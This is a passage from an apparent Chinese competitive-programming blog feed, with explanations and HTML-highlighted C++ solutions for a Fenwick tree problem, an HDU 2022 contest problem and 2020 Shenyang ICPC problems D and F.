class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> val,<span class="keyword">int</span> *c)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(x&lt;=n)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,x,val);</span></span><br><span class="line">        c[x]+=val;</span><br><span class="line">        x+=<span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_sum</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> *c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        ans+=c[x];</span><br><span class="line">        x-=<span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> cnt1[maxn],cnt2[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> t,x,y,x1,y1;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">            cnt1[x]++;</span><br><span class="line">            cnt2[y]++;</span><br><span class="line">            <span class="keyword">if</span>(cnt1[x]==<span class="number">1</span>)<span class="built_in">add</span>(x,<span class="number">1</span>,c);</span><br><span class="line">            <span class="keyword">if</span>(cnt2[y]==<span class="number">1</span>)<span class="built_in">add</span>(y,<span class="number">1</span>,d);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">            cnt1[x]--;</span><br><span class="line">            cnt2[y]--;</span><br><span class="line">            <span class="keyword">if</span>(!cnt1[x])<span class="built_in">add</span>(x,<span class="number">-1</span>,c);</span><br><span class="line">            <span class="keyword">if</span>(!cnt2[y])<span class="built_in">add</span>(y,<span class="number">-1</span>,d);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;x1,&amp;y1);</span><br><span class="line">            <span class="keyword">if</span>((<span class="built_in">get_sum</span>(x1,c)-<span class="built_in">get_sum</span>(x<span class="number">-1</span>,c))==(x1-x+<span class="number">1</span>)||(<span class="built_in">get_sum</span>(y1,d)-<span class="built_in">get_sum</span>(y<span class="number">-1</span>,d))==(y1-y+<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>树状数组很后悔没有很早学起来，因为它真的比线段树简单太多了，可惜我是先会的线段树，所以导致就没兴趣学树状数组，不过没事，现在会了也是不迟的！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;树状数组（Fenwick Tree），这次EC Final遇到过的，英文也记一下，也来学一下，刚好半夜刷题刷到了树状数组可以解决的题目！&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="数据结构" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="树状数组" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    
    
  </entry>
  
  <entry>
    <title>2022“杭电杯”中国大学生算法设计超级联赛（4）题解</title>
    <link href="http://example.com/2022/07/28/2022%E2%80%9C%E6%9D%AD%E7%94%B5%E6%9D%AF%E2%80%9D%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E8%B6%85%E7%BA%A7%E8%81%94%E8%B5%9B%EF%BC%884%EF%BC%89%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/07/28/2022%E2%80%9C%E6%9D%AD%E7%94%B5%E6%9D%AF%E2%80%9D%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E8%B6%85%E7%BA%A7%E8%81%94%E8%B5%9B%EF%BC%884%EF%BC%89%E9%A2%98%E8%A7%A3/</id>
    <published>2022-07-28T11:00:00.000Z</published>
    <updated>2022-07-28T16:46:48.696Z</updated>
    
    <content type="html"><![CDATA[<p>本场比赛写出一个 <code>1007</code> 也写一篇题解吧！</p><span id="more"></span><!--不知道她是否能答应，再等等吧！--><h2 id="1007"><a href="#1007" class="headerlink" title="1007"></a>1007</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/28/2022%E2%80%9C%E6%9D%AD%E7%94%B5%E6%9D%AF%E2%80%9D%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E8%B6%85%E7%BA%A7%E8%81%94%E8%B5%9B%EF%BC%884%EF%BC%89%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是给你 $n$ 层楼，每层楼有一个怪物，杀了怪物需要自己的攻击力超过它的血量，否则不能到达该楼层，一次可以跳 $k$ 以内的层或者下降一层，杀了怪物后这一层不能继续呆了，杀了怪物之后怪物的血量会成为自己的攻击力。</p><p>看标程是线段树写的，咱也不会，只能纯模拟啦。</p><p>首先可以肯定的一点就是：你跳了之后要把下面的怪物都收拾完，因为题目问你的是：能否解决所有怪物！！而你一次只能下降一层，不能去已经没有怪物的楼层。因此我们主要关注，我们要跳到哪里去，能收拾完下面的怪物。首先可以肯定的是：直接选择能跳的跳是肯定不行的，随便出一组数据便可知。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6 1 5</span><br><span class="line">6 1 1 2 1 4</span><br></pre></td></tr></table></figure><p>当你贪心地跳到第 $2$ 层之后你就会发现 $6$ 你收拾不了了。而这个数据是有解的，我们跳到第五层从上往下收拾完是能打过 $6$ 的。</p><p>那么其实我们就需要判断：我们跳了一个楼层之后是否能收拾下面的怪物，收拾下面的怪物是从上往下收拾，我们还可以沿途吃掉中间的怪物增长攻击力，但是这样的 <code>check</code> 乍一听好像是 <code>O(n)</code> 啊，不可行！但是其实我们可以把打不过的怪物堆起来，打得过的怪物直接扔掉，如果这次选择这层楼打不掉，那么我们选择更高的楼层去打。这样在整体的判断中，每个怪物只会被判一次，总时间复杂度能接受。</p><p>具体实现方式我们可以用栈，首先如果当前楼层我能打过我肯定直接打了，因为上一层比不上一层打肯定要好的，上了一层我还能多一个选择。那么如果当前打不过，我们就先压栈，循环k以内的数据，如果能打过，尝试过来打，并开始从栈中取出怪物来看看能否打过，能打过扔出来，打不过则继续往上走。那么不难发现，我们如果跳到了 $p$ 层，要判断能否结局 $p-i$ 层的怪物我们只需要把当前攻击力加上 $p-i+1——p$ 的怪物数值之和能否超过它的血量即可。那么这里算到和的话我们就可以前缀处理了。那么为什么不需要重复判断呢？因为我跳到这一层时，我都能打过这个怪物了，我跳到更高的层来打这个怪物会打不过？</p><p>如果说 $k$ 层遍历完了之后，我栈里面还有数据，说明我跳哪都打不完这些怪物，就放弃了。如果能跳 $p$ 层打过，我当前在 $q$ 层的话，那么我在解决完之后我身处 $q+1$ 层，中间 $q+1——p$ 层都是空楼层，都不能去，因此我们把自己放到 $p$ 层，但是同时可选择的范围要随着之前跳的高度减少。因为我原来在 $q+1$ 层本来也就只能跳到 $q+k$ 层嘛，这个应该很好理解。</p><p>那么看完这些之后，相信你不难理解下面的标程了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],pre[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld&quot;</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line">    <span class="keyword">int</span> sum=m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,a+i);</span><br><span class="line">        sum+=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        pre[i]=pre[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> now=<span class="number">0</span>;</span><br><span class="line">    stack&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;s;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,m);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(m&lt;a[i])&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=<span class="built_in">min</span>(n,i+k-len);j++)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(m&gt;=a[j])&#123;</span><br><span class="line">                    <span class="keyword">while</span>(s.<span class="built_in">size</span>())&#123;</span><br><span class="line">                        <span class="keyword">auto</span> top=s.<span class="built_in">top</span>();</span><br><span class="line">                        <span class="keyword">if</span>(m+pre[j]-pre[top.second]&gt;=a[top.second])&#123;</span><br><span class="line">                            s.<span class="built_in">pop</span>();</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                        m+=pre[j]-pre[i<span class="number">-1</span>];</span><br><span class="line">                        len=j-i+<span class="number">1</span>;</span><br><span class="line">                        i=j;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    s.<span class="built_in">push</span>(&#123;a[j],j&#125;);</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            m+=a[i];</span><br><span class="line">            len=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(m!=sum)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;本场比赛写出一个 &lt;code&gt;1007&lt;/code&gt; 也写一篇题解吧！&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="杭电杯" scheme="http://example.com/categories/icpc/%E6%9D%AD%E7%94%B5%E6%9D%AF/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/%E6%9D%AD%E7%94%B5%E6%9D%AF/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>2020沈阳icpc复盘</title>
    <link href="http://example.com/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/"/>
    <id>http://example.com/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/</id>
    <published>2022-07-25T15:00:00.000Z</published>
    <updated>2022-07-25T15:27:09.772Z</updated>
    
    <content type="html"><![CDATA[<p>和sigma姐姐vp这场icpc。</p><span id="more"></span><h2 id="D-Journey-to-Un’Goro"><a href="#D-Journey-to-Un’Goro" class="headerlink" title="D. Journey to Un’Goro"></a>D. Journey to Un’Goro</h2><p>这题是构造题，本来有思路了的，但是没敢提交。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/1.png" alt="1"></p><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>就是说给定一个长度，你需要构造一个只有 <code>r</code> 和 <code>b</code> 字符的字符串，在字符串的子串中，如果有奇数个<code>r</code>，这就是个好区间。问你一个这样长度的字符串最多有多少个好区间，并构造出最好的情况，按字典序输出，如果超过100个则输出前100个。</p><p>我们思考一下如何去计算最大值，就得先看看怎么去计数，首先暴力计数需要 $n^2$ 就肯定不行。因为是奇数个，所以我们考虑转化成前缀和。那么我们看看，如果只有一个 <code>r</code> 其它全是 <code>b</code> 我们看哪些区间符合条件。这里我们不妨把 <code>r</code> 当成 1，把 <code>b</code> 当成 0。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b b b b r r r b b b</span><br><span class="line">0 0 0 0 1 2 3 3 3 3</span><br></pre></td></tr></table></figure><p>可以很容易发现，当前缀和相减之后为奇数时，区间是好区间。那么就是偶数匹配奇数其实，因为偶数减奇数或者奇数减偶数才有可能得到奇数，而前缀和要么是偶数要么是奇数。我们最终得到的结果就是 $num=cnt_{odd}\times cnt_{even}$ 而我们很容易得到 $cnt_{odd}+cnt_{even}=n$ ，根据基本不等式我们不难得到当 $cnt_{odd}$ 与 $cnt_{even}$ 接近的时候 $num$ 得到最大值。</p><p>因为 $n$ 可能是奇数，所以我这里说的是接近。那么奇数就是一个多一个一个少一个，偶数就是都一样就好了。</p><p>那么这个可以直接算出来的。</p><p>$ans=\frac{n}{2}\times \frac{n+1}{2}$  </p><p>那么主要就是怎么构造了，也很简单，既然要字典序，我们就尽量构造 <code>b</code> 实在不行就构造 <code>r</code>。什么叫实在不行呢？那就是前缀和奇数个数超过了 <code>(n+1)/2</code> 这个时候就肯定不行。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//    clock_t start, end;</span></span><br><span class="line"><span class="comment">//    start = clock();</span></span><br><span class="line"><span class="comment">//    end = clock();</span></span><br><span class="line"><span class="comment">//    cout &lt;&lt; (double) (end - start) / CLOCKS_PER_SEC &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//ios::sync_with_stdio(false);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, x, y) for(int i=(x);i&lt;=(y);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dep(i, x, y) for(int i=(x);i&gt;=(y);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> gcd(a, b) __gcd(a,b)</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn]; </span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> p[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos,<span class="keyword">int</span> n1,<span class="keyword">int</span> n2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n1&gt;cnt||n2 &gt; cnt)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">100</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(pos==n+<span class="number">1</span>)&#123;</span><br><span class="line">        flag++;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cout&lt;&lt;s[i];</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        s[pos]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">        p[pos]=p[pos<span class="number">-1</span>];</span><br><span class="line">        p[pos] == <span class="number">1</span> ? res=<span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1 + <span class="number">1</span>, n2) : res=<span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1, n2 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(res==<span class="number">1</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        s[pos]=<span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">        p[pos<span class="number">-1</span>]==<span class="number">1</span>?p[pos]=<span class="number">2</span>:p[pos]=<span class="number">1</span>;</span><br><span class="line">        p[pos] == <span class="number">1</span> ? res = <span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1 + <span class="number">1</span>, n2) : res = <span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1, n2 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(res)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    p[<span class="number">0</span>]=<span class="number">2</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> z=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(n+<span class="number">1</span>)/<span class="number">2</span>);</span><br><span class="line">    cout&lt;&lt;z*((n+<span class="number">1</span>)/<span class="number">2</span>)&lt;&lt;endl;</span><br><span class="line">    cnt= z;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Kobolds-and-Catacombs"><a href="#F-Kobolds-and-Catacombs" class="headerlink" title="F. Kobolds and Catacombs"></a>F. Kobolds and Catacombs</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/2.png" alt="2"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是要把一个序列划分，要尽可能地多划分，被划分的序列在一个内部进行排序，最后要求整个序列不递减。那么我们一开始是很容易想到如果元素 $p_i$ 原本需要在 $j$ 的位置上，那么 $i-j$ 的位置上都应该被划分为一个集合。虽然想到了这点，但是其实还可以用这样一种方式做：前缀和！和排过序的前缀和做比较，当有一个位置前缀和相同则 +1，最后输出答案即可，这个思维一定要想到，是sigma姐姐想出来的，我根本没想到qwq。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">//int new_index;</span></span><br><span class="line">&#125;a[maxn]; </span><br><span class="line"><span class="keyword">int</span> vis[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(A a,A b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.value&lt;b.value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sum1[maxn],sum2[maxn]; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i].value);</span><br><span class="line">        a[i].index=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum1[i]=sum1[i<span class="number">-1</span>]+a[i].value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line">    